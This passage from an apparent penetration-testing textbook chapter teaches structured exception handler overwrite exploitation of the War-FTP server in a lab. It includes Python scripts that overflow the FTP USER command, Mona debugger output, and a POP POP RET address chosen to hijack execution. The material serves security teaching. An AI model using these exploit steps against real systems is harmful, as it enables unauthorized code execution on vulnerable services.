<html><head></head><body><section class="chapter" epub:type="chapter" id="structured_exception_handler_overwrites" title="Chapter&#xA0;18.&#xA0;Structured Exception Handler Overwrites"><div class="titlepage"><div><div><h2 class="title">Chapter 18. Structured Exception Handler Overwrites</h2></div></div></div><p><a class="indexterm" id="iddle1348"/><a class="indexterm" id="iddle2125"/><a class="indexterm" id="iddle2127"/><a class="indexterm" id="iddle2128"/><a class="indexterm" id="iddle2258"/>When something goes wrong and causes a program to crash, it has caused an exception. Accessing an invalid memory location is one type of exception a program can encounter.</p><p>Windows systems use a method called <span class="emphasis"><em>structured exception handlers (SEH)</em></span> to deal with program exceptions as they arise. SEH are similar to try/catch blocks in Java: Code is executed, and if something goes wrong, the function stops executing and passes execution to SEH.</p><p>Each function can have its own SEH registration entry. An <span class="emphasis"><em>SEH registration record</em></span> is eight bytes long, consisting of a pointer to the next SEH record (NSEH) followed by the memory address of the exception handler, as illustrated in <a class="xref" href="ch18.xhtml#seh_structure" title="Figure 18-1. SEH structure">Figure 18-1</a>. The list of all the SEH entries is the <span class="emphasis"><em>SEH chain</em></span>.</p><div class="figure"><a id="seh_structure"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00175"/><img alt="SEH structure" src="httpatomoreillycomsourcenostarchimages2030540.png"/></div></div><div class="figure-title">Figure 18-1. SEH structure</div></div><p><a class="indexterm" id="iddle2126"/>In many cases, an application uses only the operating system’s SEH entry to handle exceptions. You are probably already familiar with this usage; it puts up a message box with something like “Application X has encountered a problem and needs to close.” However, programs can also specify custom SEH entries. When an exception is encountered, execution will be passed to the SEH chain to look for an entry that can handle the exception. To view the SEH chain for an application in Immunity Debugger, go to <span class="strong"><strong>View</strong></span> ▸ <span class="strong"><strong>SEH chain</strong></span>, as illustrated in <a class="xref" href="ch18.xhtml#viewing_the_seh_chain" title="Figure 18-2. Viewing the SEH chain">Figure 18-2</a>.</p><div class="figure"><a id="viewing_the_seh_chain"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00176"/><img alt="Viewing the SEH chain" src="httpatomoreillycomsourcenostarchimages2030542.png"/></div></div><div class="figure-title">Figure 18-2. Viewing the SEH chain</div></div><div class="sect1" title="SEH Overwrite Exploits"><div class="titlepage"><div><div><h2 class="title" id="seh_overwrite_exploits" style="clear: both">SEH Overwrite Exploits</h2></div></div></div><p><a class="indexterm" id="iddle1216"/><a class="indexterm" id="iddle1304"/><a class="indexterm" id="iddle1382"/><a class="indexterm" id="iddle2260"/><a class="indexterm" id="iddle2419"/>Now let’s look at using SEH entries to take control of a program. A natural question when working through the War-FTP buffer overflow example in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a> would be, Why are we limited to 607 bytes for our shellcode? Why can’t we write an even longer attack string and create a payload that’s as long as we like?</p><p>We’ll begin our exploration of SEH overwrites with the exploit we used to crash War-FTP. Instead of the 1,100-byte exploit string that we used in the example in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>, let’s try crashing War-FTP with a 1,150-byte string of <span class="emphasis"><em>A</em></span>s, as shown in <a class="xref" href="ch18.xhtml#war-ftp_exploit_with_1comma150_as" title="Example 18-1. War-FTP exploit with 1,150 As">Example 18-1</a>.</p><div class="example"><a id="war-ftp_exploit_with_1comma150_as"/><div class="example-title">Example 18-1. War-FTP exploit with 1,150 As</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat ftpexploit2</strong></span>&#13;
#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 1150&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.close()</pre></div></div><p>As shown in <a class="xref" href="ch18.xhtml#program_crashes_without_eip_controldot" title="Figure 18-3. A program crashes without EIP control.">Figure 18-3</a>, the program crashes as expected, but this time our access violation is a bit different from the one in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>. EIP points to <code class="literal">0x77C3F973</code>, a valid instruction inside <span class="emphasis"><em>MSVCRT.dll</em></span>. Instead of overwriting the saved return pointer and crashing the program with EIP control, War-FTP crashed writing to memory address <code class="literal">0x00B00000</code>.</p><p>Notice in the CPU pane that the instruction at <code class="literal">0x77C3F973</code> is <code class="literal">MOV BYTE PTR</code> <code class="literal">DS:[EAX], 0</code>. Basically, the program is trying to write to the memory location of the value of <code class="literal">EAX</code>. Looking at the top right of Immunity Debugger, the Registers pane, we see <code class="literal">EAX</code> contains the value <code class="literal">00B00000</code>. Something about our attack string seems to have corrupted <code class="literal">EAX</code>, because the program is now trying to write to a memory location that is not writable. Without EIP control, is this crash still viable? Really long attack strings frequently cause an exception by trying to write data off the end of the stack.</p><p>Before we write off this exploit and move on, take a look at the SEH chain. As shown in <a class="xref" href="ch18.xhtml#seh_overwritten" title="Figure 18-4. SEH overwritten">Figure 18-4</a>, the structured exception handler has been overwritten with <span class="emphasis"><em>A</em></span>s. Recall that in the event of a crash, execution is passed to SEH. Though we were not able to control EIP directly at the time of the crash, perhaps controlling SEH will allow us to still hijack execution.</p><div class="figure"><a id="program_crashes_without_eip_controldot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00177"/><img alt="A program crashes without EIP control." src="httpatomoreillycomsourcenostarchimages2030544.png.jpg"/></div></div><div class="figure-title">Figure 18-3. A program crashes without EIP control.</div></div><div class="figure"><a id="seh_overwritten"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00178"/><img alt="SEH overwritten" src="httpatomoreillycomsourcenostarchimages2030546.png.jpg"/></div></div><div class="figure-title">Figure 18-4. SEH overwritten</div></div><p><a class="indexterm" id="iddle1753"/>Just as we used Mona to create a cyclic pattern to see which four bytes overwrote the saved return pointer in the previous chapter, we will find which four <span class="emphasis"><em>A</em></span>s are overwriting SEH using the command <code class="literal">!mona pattern_create 1150</code> in Immunity Debugger, as shown in <a class="xref" href="ch18.xhtml#generating_a_cyclic_pattern_with_mona" title="Figure 18-5. Generating a cyclic pattern with Mona">Figure 18-5</a>.</p><div class="figure"><a id="generating_a_cyclic_pattern_with_mona"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00179"/><img alt="Generating a cyclic pattern with Mona" src="httpatomoreillycomsourcenostarchimages2030548.png.jpg"/></div></div><div class="figure-title">Figure 18-5. Generating a cyclic pattern with Mona</div></div><p><a class="indexterm" id="iddle1749"/>Copy the resulting pattern from <span class="emphasis"><em>C:\logs\war-ftpd\pattern.txt</em></span> into the exploit in place of the 1,150 <span class="emphasis"><em>A</em></span>s, as shown in <a class="xref" href="ch18.xhtml#using_pattern_generation_to_pinpoint_the" title="Example 18-2. Using pattern generation to pinpoint the SEH overwrite in the attack string">Example 18-2</a>.</p><div class="example"><a id="using_pattern_generation_to_pinpoint_the"/><div class="example-title">Example 18-2. Using pattern generation to pinpoint the SEH overwrite in the attack string</div><div class="example-contents"><pre class="programlisting">  root@kali:~# <span class="strong"><strong>cat ftpexploit2</strong></span>&#13;
  #!/usr/bin/python&#13;
  import socket&#13;
❶ buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2&#13;
  Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8&#13;
  Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4&#13;
  Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0&#13;
  Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6&#13;
  Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2&#13;
  Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8&#13;
  Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au5Au6&#13;
  Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2&#13;
  Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8&#13;
  Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4&#13;
  Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0&#13;
  Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6&#13;
  Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2&#13;
  Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B"&#13;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
  connect=s.connect(('192.168.20.10',21))&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.send('USER ' + buffer  + '\r\n')&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.close()</pre></div></div><p>Here we’ve generated a 1,150-character pattern and replaced the string of <span class="emphasis"><em>A</em></span>s at ❶. Next, restart War-FTP in Immunity Debugger, and run the exploit again. As shown in <a class="xref" href="ch18.xhtml#seh_overwritten_with_monaapostrophes_pat" title="Figure 18-6. SEH overwritten with Mona’s pattern">Figure 18-6</a>, SEH is overwritten with <code class="literal">41317441</code>.</p><div class="figure"><a id="seh_overwritten_with_monaapostrophes_pat"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00180"/><img alt="SEH overwritten with Mona’s pattern" src="httpatomoreillycomsourcenostarchimages2030550.png.jpg"/></div></div><div class="figure-title">Figure 18-6. SEH overwritten with Mona’s pattern</div></div><p>Now use <code class="literal">!mona findmsp</code> to find out where in our 1,150-character attack string the SEH entry is overwritten, as shown in <a class="xref" href="ch18.xhtml#finding_the_seh_overwrite_in_the_cyclic" title="Figure 18-7. Finding the SEH overwrite in the cyclic pattern">Figure 18-7</a>.</p><div class="figure"><a id="finding_the_seh_overwrite_in_the_cyclic"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00181"/><img alt="Finding the SEH overwrite in the cyclic pattern" src="httpatomoreillycomsourcenostarchimages2030552.png.jpg"/></div></div><div class="figure-title">Figure 18-7. Finding the SEH overwrite in the cyclic pattern</div></div><p><a class="indexterm" id="iddle2266"/>Looking through the log output at <span class="emphasis"><em>C:\logs\war-ftpd\findmsp.txt</em></span>, shown in part here, we find that the NSEH entry is overwritten 569 bytes into the attack string. Recall from <a class="xref" href="ch18.xhtml#seh_structure" title="Figure 18-1. SEH structure">Figure 18-1</a> that SEH chain entries are made up of eight bytes (the NSEH entry followed by the SEH pointer). Thus our SEH overwrite is at 573 bytes into our attack string (four bytes after NSEH).</p><a id="pro_id00210"/><pre class="programlisting">[+] Examining SEH chain&#13;
    SEH record (nseh field) at 0x00affd94 overwritten with normal pattern : 0x41317441 (offset 569), followed by 577 bytes of cyclic data</pre></div><div class="sect1" title="Passing Control to SEH"><div class="titlepage"><div><div><h2 class="title" id="passing_control_to_seh" style="clear: both">Passing Control to SEH</h2></div></div></div><p>Back on the Windows XP target, the bottom of the Immunity Debugger screen shows the access violation and also notes that you can type <span class="smaller">shift</span>-F7/F8/F9 to pass an exception to the program. In this case, the program will attempt to execute the memory address <code class="literal">41317441</code>, the string that has overwritten SEH. Use <span class="smaller">shift</span>-F9 to run the program until the next error occurs. As shown in <a class="xref" href="ch18.xhtml#execution_is_passed_to_the_overwritten_s" title="Figure 18-8. Execution is passed to the overwritten SEH.">Figure 18-8</a>, the program receives an access violation when attempting to access the memory address <code class="literal">41317441</code>. As in the previous examples, we will put a useful memory address in the place of <code class="literal">41317441</code> to successfully hijack execution.</p><p>Also note in <a class="xref" href="ch18.xhtml#execution_is_passed_to_the_overwritten_s" title="Figure 18-8. Execution is passed to the overwritten SEH.">Figure 18-8</a> that when execution is passed to SEH, many of our registers have been zeroed out. This might make jumping to an attacker-controlled register more difficult.</p><div class="figure"><a id="execution_is_passed_to_the_overwritten_s"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00182"/><img alt="Execution is passed to the overwritten SEH." src="httpatomoreillycomsourcenostarchimages2030554.png.jpg"/></div></div><div class="figure-title">Figure 18-8. Execution is passed to the overwritten SEH.</div></div><p><a class="indexterm" id="iddle1081"/><a class="indexterm" id="iddle1340"/><a class="indexterm" id="iddle1407"/><a class="indexterm" id="iddle1678"/><a class="indexterm" id="iddle2228"/><a class="indexterm" id="iddle2261"/>Of the registers that have not been zeroed out, none appears to point to a portion of our attack string. Clearly, a simple <code class="literal">JMP ESP</code> in SEH will not work to redirect execution to attacker-controlled memory. Things are still looking pretty bleak in our search for exploitability.</p></div><div class="sect1" title="Finding the Attack String in Memory"><div class="titlepage"><div><div><h2 class="title" id="finding_the_attack_string_in_memory" style="clear: both">Finding the Attack String in Memory</h2></div></div></div><p>Of course, in this case, we already have a working saved return pointer overwrite exploit. However, some programs will be vulnerable only to SEH overwrites, so developing a method to exploit these issues is of the utmost importance. Luckily, an attacker-controlled memory address is on the horizon for SEH overwrites. As shown in <a class="xref" href="ch18.xhtml#following_esp_on_the_stack" title="Figure 18-9. Following ESP on the stack">Figure 18-9</a>, highlight the ESP register in Immunity Debugger, right-click, and select <span class="strong"><strong>Follow in Stack</strong></span>.</p><div class="figure"><a id="following_esp_on_the_stack"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00183"/><img alt="Following ESP on the stack" src="httpatomoreillycomsourcenostarchimages2030556.png.jpg"/></div></div><div class="figure-title">Figure 18-9. Following ESP on the stack</div></div><p>Though the contents of the ESP register do not point to any part of our cyclic pattern, two steps down from ESP, at ESP+8, we see that memory address <code class="literal">00AFD94</code> points to our cyclic pattern in memory, as shown in <a class="xref" href="ch18.xhtml#cyclic_pattern_eight_bytes_higher_than_e" title="Figure 18-10. Cyclic pattern eight bytes higher than ESP">Figure 18-10</a>. If we can find a way to remove two elements from the stack and then execute the contents of this memory address, we can execute shellcode in place of the pattern.</p><div class="figure"><a id="cyclic_pattern_eight_bytes_higher_than_e"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00184"/><img alt="Cyclic pattern eight bytes higher than ESP" src="httpatomoreillycomsourcenostarchimages2030558.png.jpg"/></div></div><div class="figure-title">Figure 18-10. Cyclic pattern eight bytes higher than ESP</div></div><p>The location of NSEH is <code class="literal">00AFFD94</code>, as noted by the output of Mona’s <code class="literal">findmsp</code> command. We can verify this by right-clicking <code class="literal">00AFFD94</code> in the stack pane and clicking <span class="strong"><strong>Follow in Stack</strong></span>, as shown in <a class="xref" href="ch18.xhtml#cyclic_pattern_in_the_pointer_to_the_nex" title="Figure 18-11. Cyclic pattern in the pointer to the next SEH record">Figure 18-11</a>.</p><div class="figure"><a id="cyclic_pattern_in_the_pointer_to_the_nex"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00185"/><img alt="Cyclic pattern in the pointer to the next SEH record" src="httpatomoreillycomsourcenostarchimages2030560.png.jpg"/></div></div><div class="figure-title">Figure 18-11. Cyclic pattern in the pointer to the next SEH record</div></div><p>As discussed earlier, SEH entries are eight-byte-long linked lists consisting of a pointer to the next SEH record in the chain and the memory address of the handler on the stack. If we can load ESP+8 into EIP, we can execute some shellcode. Unfortunately, it looks like we have only four bytes to work with before we hit the SEH entry itself, but let’s deal with one problem at a time. We need to find a viable way of getting to our shellcode, and then we will return to making our shellcode fit into the space available.</p><p>Before we move on, let’s verify that our offsets are correct, as shown in <a class="xref" href="ch18.xhtml#verifying_overwrite_offsets" title="Example 18-3. Verifying overwrite offsets">Example 18-3</a>.</p><div class="example"><a id="verifying_overwrite_offsets"/><div class="example-title">Example 18-3. Verifying overwrite offsets</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 569 + "B" * 4 + "C" * 4 + "D" * 573 ❶&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.close()</pre></div></div><p>Edit your exploit program to send over 569 <span class="emphasis"><em>A</em></span>s, followed by 4 <span class="emphasis"><em>B</em></span>s, followed by 4 <span class="emphasis"><em>C</em></span>s, and rounding out the 1,150 byte attack string with 573 <span class="emphasis"><em>D</em></span>s at ❶. Restart War-FTP and run the exploit again. We see in <a class="xref" href="ch18.xhtml#seh_is_overwritten_by_four_csdot" title="Figure 18-12. SEH is overwritten by four Cs.">Figure 18-12</a> that SEH is overwritten by our 4 <span class="emphasis"><em>C</em></span>s.</p><div class="figure"><a id="seh_is_overwritten_by_four_csdot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00186"/><img alt="SEH is overwritten by four Cs." src="httpatomoreillycomsourcenostarchimages2030562.png.jpg"/></div></div><div class="figure-title">Figure 18-12. SEH is overwritten by four Cs.</div></div><p><a class="indexterm" id="iddle1950"/><a class="indexterm" id="iddle2018"/><a class="indexterm" id="iddle2065"/><a class="indexterm" id="iddle2229"/>If we again type <span class="smaller">shift</span>-F9 to pass the exception handler to the crashed program, War-FTP crashes a second time when accessing the memory address <code class="literal">43434343</code>, our <span class="emphasis"><em>C</em></span>s. Now follow the ESP register in the stack. As shown in <a class="xref" href="ch18.xhtml#espplus8_is_attacker_controlleddot" title="Figure 18-13. ESP+8 is attacker controlled.">Figure 18-13</a>, ESP+8 points to a memory address filled with the four <span class="emphasis"><em>B</em></span>s followed by our four <span class="emphasis"><em>C</em></span>s and then the <span class="emphasis"><em>D</em></span>s.</p><div class="figure"><a id="espplus8_is_attacker_controlleddot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00187"/><img alt="ESP+8 is attacker controlled." src="httpatomoreillycomsourcenostarchimages2030564.png.jpg"/></div></div><div class="figure-title">Figure 18-13. ESP+8 is attacker controlled.</div></div><p>Our offsets are correct. Now to find a way to redirect execution to ESP+8. Unfortunately, a simple <code class="literal">JMP ESP</code> won’t cut it this time.</p></div><div class="sect1" title="POP POP RET"><div class="titlepage"><div><div><h2 class="title" id="pop_pop_ret" style="clear: both">POP POP RET</h2></div></div></div><p>We need an instruction, or series of instructions, that will allow us to move eight bytes down the stack and then execute the contents of the memory address located at ESP+8. To figure out the assembly instructions we need, we must consider how the stack works.</p><p>The stack is a last-in, first-out (LIFO) structure. The analogy of a stack of trays in a cafeteria is often used for this concept. The last tray put on the stack by cafeteria staff is the first one grabbed by a cafeteria patron. The assembly command equivalents of the tray being added to the stack and then picked up by a patron are <code class="literal">PUSH</code> and <code class="literal">POP</code>, respectively.</p><p>Recall that ESP points to the top (lowest memory address) of the current stack frame. If we use the <code class="literal">POP</code> instruction to pop one entry (four bytes) off the stack, ESP will now point to ESP+4. Thus, if we execute two <code class="literal">POP</code> instructions in succession, ESP will now point to ESP+8, which is exactly what we are going for.</p><p><a class="indexterm" id="iddle2096"/><a class="indexterm" id="iddle2264"/>Finally, to redirect our execution to our attacker-controlled string, we need to load the value of ESP+8 (now in ESP after our two <code class="literal">POP</code> instructions) into EIP (the next memory address to be executed). Luckily, there’s an instruction for that, namely, the <code class="literal">RET</code> instruction. By design, <code class="literal">RET</code> takes the contents of the ESP register and loads them into EIP to be executed next.</p><p>If we can find these three instructions, <code class="literal">POP</code> <span class="emphasis"><em><code class="literal">&lt;some register&gt;</code></em></span>, <code class="literal">POP</code> <span class="emphasis"><em><code class="literal">&lt;some register&gt;</code></em></span>, <code class="literal">RET</code> (often abbreviated by exploit developers as <code class="literal">POP POP RET</code>), we should be able to redirect the program’s execution by overwriting SEH with the memory address of the first <code class="literal">POP</code> instruction. The contents of ESP will then be popped into the register indicated by the instruction. We don’t particularly care which register gets the honor of holding the popped-off data, as long as it’s not ESP itself. We care only about burning things off the stack until we get to ESP+8.</p><p>Next, the second <code class="literal">POP</code> instruction is executed. Now ESP points to the original ESP+8. Then, the <code class="literal">RET</code> instruction is executed, and ESP (ESP+8 when the SEH was executed) is loaded into EIP. Recall from the previous section that ESP+8 held a memory address that points to byte 569 of our attacker-controlled string.</p><div class="note" title="Note"><h3 class="title"><a id="ch18note01"/>Note</h3><p>As with <code class="literal">JMP ESP</code>, it is not a hard requirement that we find <code class="literal">POP POP RET</code> instructions. Logical equivalents, such as adding eight bytes to ESP followed by a <code class="literal">RET</code> and others, would work just as well.</p></div><p>Though this technique is a little more complicated, it’s similar to the saved return pointer buffer overflow exercise we completed in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>. We are hijacking the program’s execution and redirecting it to our shellcode. Now we need to find an instance of <code class="literal">POP POP RET</code> instructions in War-FTP or its executable modules.</p></div><div class="sect1" title="SafeSEH"><div class="titlepage"><div><div><h2 class="title" id="safeseh" style="clear: both">SafeSEH</h2></div></div></div><p>As SEH overwrite attacks have become prevalent, Microsoft has come up with ways to stop them from working. One such example is SafeSEH. Programs compiled with SafeSEH record the memory locations that will be used for structured exception handling, which means that attempts to redirect execution to a memory location with <code class="literal">POP POP RET</code> instructions will fail the SafeSEH check.</p><p>It’s important to realize that even if DLLs in Windows XP SP2 and later are compiled with SafeSEH, third-party software doesn’t have to implement this mitigation technique. If War-FTP or any of its custom DLLs do not use SafeSEH, we may not have to deal with this check.</p><p>Mona will determine which modules are not compiled with SafeSEH in the process of finding the <code class="literal">POP POP RET</code> instructions when we use the command <code class="literal">!mona seh</code>, as shown in <a class="xref" href="ch18.xhtml#running_the_seh_command_in_mona" title="Figure 18-14. Running the SEH command in Mona">Figure 18-14</a>.</p><div class="figure"><a id="running_the_seh_command_in_mona"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00188"/><img alt="Running the SEH command in Mona" src="httpatomoreillycomsourcenostarchimages2030566.png.jpg"/></div></div><div class="figure-title">Figure 18-14. Running the SEH command in Mona</div></div><p><a class="indexterm" id="iddle1751"/>The results of <code class="literal">!mona seh</code> are written to <span class="emphasis"><em>C:\logs\war-ftpd\seh.txt</em></span>, as shown in part here.</p><a id="pro_id00211"/><pre class="programlisting">0x5f401440 : pop edi # pop ebx # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_&#13;
READ} [MFC42.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: False,&#13;
v4.2.6256 (C:\Documents and Settings\georgia\Desktop\MFC42.DLL)&#13;
0x5f4021bf : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [MFC42.DLL]&#13;
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents&#13;
and Settings\georgia\Desktop\MFC42.DLL)&#13;
0x5f4580ca : pop ebx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [MFC42.DLL]&#13;
ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.6256 (C:\Documents&#13;
and Settings\georgia\Desktop\MFC42.DLL)&#13;
0x004012f2 : pop edi # pop esi # ret 0x04 | startnull {PAGE_EXECUTE_READ}&#13;
[war-ftpd.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.6.5.0&#13;
(C:\Documents and Settings\georgia\Desktop\war-ftpd.exe)</pre><p>As you can see from the output, the only modules without SafeSEH are the War-FTP executable itself and a War-FTP-included DLL called <span class="emphasis"><em>MFC42.dll</em></span>. We need to choose an instance of <code class="literal">POP POP RET</code> (or a logical equivalent) from Mona’s output that avoids the four bad characters discussed in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a> (\x00, \x40, \x0a, \x0d). (To have Mona automatically exclude entries with bad characters during the search, enter <span class="strong"><strong><code class="literal">!mona seh -cpb "\x00\x40\x0a\x0d"</code></strong></span>. One such address is <code class="literal">5F4580CA</code>. The instructions are <code class="literal">POP</code> <code class="literal">EBX</code>, <code class="literal">POP EBP</code>, <code class="literal">RET</code>. Again, we don’t care where the instructions are stored, as long as we <code class="literal">POP</code> two entries off the stack. If we overwrite SEH with the address <code class="literal">5F4580CA</code>, these instructions will be executed, and we will redirect execution to our attack string.</p><p><a class="indexterm" id="iddle2262"/>Before we move on, set a breakpoint at <code class="literal">5F4580CA</code> with <code class="literal">bp 0x5F4580CA</code>, as shown in <a class="xref" href="ch18.xhtml#breakpoint_at_the_pop_pop_ret" title="Figure 18-15. Breakpoint at the POP POP RET">Figure 18-15</a>.</p><div class="figure"><a id="breakpoint_at_the_pop_pop_ret"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00189"/><img alt="Breakpoint at the POP POP RET" src="httpatomoreillycomsourcenostarchimages2030568.png.jpg"/></div></div><div class="figure-title">Figure 18-15. Breakpoint at the <code class="literal">POP POP RET</code></div></div><p>Replace the four <span class="emphasis"><em>C</em></span>s in the previous exploit with the <code class="literal">POP POP RET</code> memory address in little-endian format, as shown in <a class="xref" href="ch18.xhtml#replacing_the_seh_overwrite_with_pop_pop" title="Example 18-4. Replacing the SEH overwrite with POP POP RET">Example 18-4</a>.</p><div class="example"><a id="replacing_the_seh_overwrite_with_pop_pop"/><div class="example-title">Example 18-4. Replacing the SEH overwrite with <code class="literal">POP POP RET</code></div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 569 + "B" * 4 + "\xCA\x80\x45\x5F" + "D" * 573&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.close()</pre></div></div><p>Now run the exploit again. As you can see in <a class="xref" href="ch18.xhtml#seh_overwritten_with_a_pop_pop_ret_addre" title="Figure 18-16. SEH overwritten with a POP POP RET address">Figure 18-16</a>, the program crashes again, and, as expected, SEH is overwritten with <code class="literal">5F4580CA</code>.</p><div class="figure"><a id="seh_overwritten_with_a_pop_pop_ret_addre"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00190"/><img alt="SEH overwritten with a POP POP RET address" src="httpatomoreillycomsourcenostarchimages2030570.png.jpg"/></div></div><div class="figure-title">Figure 18-16. SEH overwritten with a <code class="literal">POP POP RET</code> address</div></div><p><a class="indexterm" id="iddle2263"/>Type <span class="smaller">shift</span>-F9 to let the program pass the overwritten exception handler. As expected, we hit our breakpoint, as shown in <a class="xref" href="ch18.xhtml#we_hit_our_breakpointdot" title="Figure 18-17. We hit our breakpoint.">Figure 18-17</a>.</p><div class="figure"><a id="we_hit_our_breakpointdot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00191"/><img alt="We hit our breakpoint." src="httpatomoreillycomsourcenostarchimages2030572.png.jpg"/></div></div><div class="figure-title">Figure 18-17. We hit our breakpoint.</div></div><p><a class="indexterm" id="iddle2150"/><a class="indexterm" id="iddle2265"/>The CPU pane (top left) shows that the next instructions to be executed are the <code class="literal">POP POP RET</code>. Press <span class="strong"><strong>F7</strong></span> to step through the instructions one at a time, and watch what happens to the stack (bottom right) as you do. You will see ESP move down to a higher address as we execute the <code class="literal">POP</code> instructions. As you can see in <a class="xref" href="ch18.xhtml#execution_is_redirected_to_your_attack_s" title="Figure 18-18. Execution is redirected to your attack string.">Figure 18-18</a>, when we execute the <code class="literal">RET</code> instruction we end up in our attack string, at the pointer to the NSEH record, which is currently filled with four <span class="emphasis"><em>B</em></span>s.</p><div class="figure"><a id="execution_is_redirected_to_your_attack_s"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00192"/><img alt="Execution is redirected to your attack string." src="httpatomoreillycomsourcenostarchimages2030574.png.jpg"/></div></div><div class="figure-title">Figure 18-18. Execution is redirected to your attack string.</div></div><p>We have solved our first problem: We have redirected the program’s execution to our attack string. Unfortunately, as we can see in <a class="xref" href="ch18.xhtml#execution_is_redirected_to_your_attack_s" title="Figure 18-18. Execution is redirected to your attack string.">Figure 18-18</a>, we only have four useable bytes before we run into our SEH overwrite address, <code class="literal">5F4580CA</code>. We have a long string of <span class="emphasis"><em>D</em></span>s after the SEH address, but currently we are stuck with only four bytes to work with. We won’t be able to do much with only four bytes of shellcode.</p></div><div class="sect1" title="Using a Short Jump"><div class="titlepage"><div><div><h2 